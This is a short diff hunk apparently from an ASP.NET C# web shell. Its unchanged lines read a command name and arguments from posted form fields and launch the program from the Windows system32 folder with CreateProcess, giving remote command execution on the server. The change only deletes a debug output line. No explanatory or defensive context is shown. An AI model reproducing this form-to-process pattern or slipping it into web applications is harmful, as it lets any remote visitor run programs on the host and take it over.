@@ -53,8 +53,7 @@
                  string args = @Request.Form["args"].ToString();
                  string lpApplicationName =  @"C:\\windows\\system32\\" +  @command;
                  Boolean bRet = CreateProcess(lpApplicationName, args, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
-              Response.Write("foo" + bRet);
-
+             
              }
 
              catch (Exception ex)
